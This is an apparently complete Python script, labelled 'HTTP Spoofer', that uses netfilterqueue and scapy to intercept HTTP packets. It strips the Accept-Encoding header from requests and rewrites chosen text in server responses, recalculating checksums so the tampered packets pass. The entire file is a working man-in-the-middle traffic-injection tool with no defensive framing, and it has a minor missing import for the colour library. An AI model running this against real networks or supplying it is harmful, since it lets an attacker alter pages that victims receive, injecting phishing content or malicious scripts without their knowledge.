#!/usr/bin/env python3

import re
import sys
import argparse
import netfilterqueue
import scapy.all as scapy
from modules.my_utils import show_message
from modules.exit_handler import setup_signal_handler

### Functions #############################################################################################################

def get_arguments():
    parser = argparse.ArgumentParser(description='HTTP Spoofer')
    parser.add_argument('-t', '--text-original', dest='text_original', required=True, help='Text a substituir')
    parser.add_argument('-r', '--text-replace', dest='text_replace', required=True, help='Text substitut')
    
    options = parser.parse_args()
    return options

def set_load(packet, load):
    packet[scapy.Raw].load = load

    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

    print(packet)

    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    
    if scapy_packet.haslayer(scapy.Raw):
        try:
            if scapy_packet[scapy.TCP].dport == 80:
                print(f"\n{Fore.YELLOW}[+] {Fore.CYAN}Solicitud:\n")
                modified_load = re.sub(b"Accept-Encoding:.*?\\r\\n", b"", scapy_packet[scapy.Raw].load)
                new_packet = set_load(scapy_packet, modified_load)
                packet.set_payload(new_packet.build())

            elif scapy_packet[scapy.TCP].sport == 80:
                print(f"\n{Fore.YELLOW}[-] {Fore.CYAN}Respuesta:\n")
                modified_load = scapy_packet[scapy.Raw].load.replace(original_text, replace_text)
                new_packet = set_load(scapy_packet, modified_load)
                packet.set_payload(new_packet.build())

            print(scapy_packet)


        except Exception as e:
            print(f"\n{Fore.RED}[!] {Fore.YELLOW}Error: {Fore.WHITE}{e}")

    packet.accept()



### Main Code #############################################################################################################

def main():
    args = get_arguments()

    show_message("Executing: ", "info", "HTTP Spoofer")
    setup_signal_handler()

    global original_text, replace_text
    original_text = args.text_original.encode()
    replace_text = args.text_replace.encode()

    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()

if __name__ == "__main__":
    main()
